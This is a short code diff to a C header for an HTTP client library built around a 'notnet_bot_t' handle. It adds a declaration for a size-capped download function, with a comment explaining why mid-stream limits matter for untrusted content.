@@ -389,6 +389,12 @@ int http_get_url(notnet_bot_t *bot, const char *url, char *buf, int len);
 /* #190: drop URL builder — one-time download token with ?secret= fallback. */
 int build_drop_url(notnet_bot_t *bot, char *dl_url, size_t sz);
 int http_read(notnet_bot_t *bot, char *buf, int len);
+/* #293: size-capped download. Aborts mid-stream (and unlinks dest) once
+ * more than max_bytes would be written — callers fetching untrusted
+ * content must not rely on a post-hoc file-size check. */
+int http_download_max(notnet_bot_t *bot, const char *url, const char *dest,
+                      long max_bytes);
+/* Historical 32MB-cap variant; see http_download_max(). */
 int http_download(notnet_bot_t *bot, const char *url, const char *dest);
 int http_upload(notnet_bot_t *bot, const char *file_path, const char *upload_path);
 void http_disconnect(notnet_bot_t *bot);
